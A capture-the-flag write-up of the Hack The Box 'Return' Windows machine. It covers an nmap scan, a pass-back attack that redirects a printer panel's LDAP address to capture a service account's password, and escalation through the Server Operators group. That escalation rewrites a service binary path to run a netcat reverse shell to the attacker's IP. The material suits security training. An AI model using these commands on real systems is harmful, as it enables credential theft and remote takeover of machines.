@@ -1,0 +1,225 @@
+---
+title: HTB - Return (Easy)
+date: '2025-07-12'
+tags: ['machine', 'windows', 'Active Directory', 'Pass-Back Attack', 'Server Operators']
+draft: false
+summary: Early recon reveals a web-based LDAP Server that allows for exfiltrating sensitive credentials and gaining user access, escalating privileges by identifying the user is a member of the Server Operators group  
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.129.95.241
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-12 20:07 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Initiating Connect Scan at 20:07
+Scanning printer.return.local (10.129.95.241) [1000 ports]
+Discovered open port 80/tcp on 10.129.95.241
+Discovered open port 139/tcp on 10.129.95.241
+Discovered open port 445/tcp on 10.129.95.241
+Discovered open port 53/tcp on 10.129.95.241
+Discovered open port 135/tcp on 10.129.95.241
+Discovered open port 636/tcp on 10.129.95.241
+Discovered open port 3268/tcp on 10.129.95.241
+Discovered open port 3269/tcp on 10.129.95.241
+Discovered open port 593/tcp on 10.129.95.241
+Discovered open port 464/tcp on 10.129.95.241
+Discovered open port 389/tcp on 10.129.95.241
+Discovered open port 88/tcp on 10.129.95.241
+Completed Connect Scan at 20:07, 0.31s elapsed (1000 total ports)
+Initiating Service scan at 20:07
+Scanning 12 services on printer.return.local (10.129.95.241)
+Completed Service scan at 20:07, 8.65s elapsed (12 services on 1 host)
+NSE: Script scanning 10.129.95.241.
+Initiating NSE at 20:07
+Completed NSE at 20:07, 10.63s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 4.64s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Nmap scan report for printer.return.local (10.129.95.241)
+Host is up (0.017s latency).
+Not shown: 988 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: HTB Printer Admin Panel
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-12 12:26:14Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-07-12T12:26:19
+|_  start_date: N/A
+|_clock-skew: 18m34s
+
+NSE: Script Post-scanning.
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
+```
+
+Scanning shows that standard ports are opened including `445` and `80`.
+
+---
+
+## Recon
+
+I already tested for SMB Anonymous access but doesn't work so let's check out the webpage.
+
+![Description](/static/images/htb/windows/return/1.jpg)
+
+We are met with what looks like a printer page. It also has a settings page some useful information. It 
+reveals a valid `username` and what looks like a password
+
+![Description](/static/images/htb/windows/return/2.jpg)
+
+Inspecting it using dev tools does not reveal the password, its just prefilled with asterisks
+
+![Description](/static/images/htb/windows/return/3.jpg)
+
+Even if we try to update the settings it doesn't really update it, checking Burp, we can see an 
+unusual parameter
+
+![Description](/static/images/htb/windows/return/4.jpg)
+
+This got me thinking, what if we replace the address with our own address and open up a listener at 
+the specific port which it is listening which is `389` which is also the LDAP port.
+
+```shell
+POST /settings.php HTTP/1.1
+Host: return.local
+Content-Length: 14
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://return.local
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://return.local/settings.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+ip=10.10.14.32
+```
+
+This is called the [Pass-Back Attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
+
+![Description](/static/images/htb/windows/return/5.jpg)
+
+And we received something that looks like a password, let us verify it along with WinRM access
+
+![Description](/static/images/htb/windows/return/6.jpg)
+
+---
+
+## Gaining Access
+
+
+annddd yes, we can definitely WinRM into `svc-printer` and can go ahead and grab the user flag
+
+![Description](/static/images/htb/windows/return/7.jpg)
+
+---
+
+## Privilege Escalation
+
+Runnning `whoami /priv` we can check for available privileges
+
+![Description](/static/images/htb/windows/return/8.jpg)
+
+We can see a lot of available privileges we can abuse such as SeBackupPrivilege, SeRestorePrivilege, SeLoadDriverPrivilege
+but none of them will work. Why? because I already tried them and the only reason I could think of is Administrator is
+probably not allowed to WinRM?
+
+So I checked the Groups
+
+![Description](/static/images/htb/windows/return/9.jpg)
+
+`svc-printer` is a member of the `Server Operators` group which is not a vulnerability itself
+but can be utilized by attackers to make changes in the domain that could escalate to system privileges
+
+First we need to upload `netcat.exe` over to the target then list the available services
+
+![Description](/static/images/htb/windows/return/10.jpg)
+
+We will use the service "VMTools" and its binary path for this exploitation.
+
+Replace the service binary with our uploaded netcat with a cmd reverse shell command
+
+```
+sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc64.exe -e cmd.exe 10.10.14.32 1234"
+```
+
+Start a listener. Then, stop the service and then start it again
+
+```
+sc.exe stop VMTools
+sc.exe start VMTools
+```
+
+Our listener should catch the shell
+
+![Description](/static/images/htb/windows/return/11.jpg)
+
+Great! Now that we are SYSTEM, we can easily grab the root flag
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+![Description](/static/images/htb/windows/return/12.jpg)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
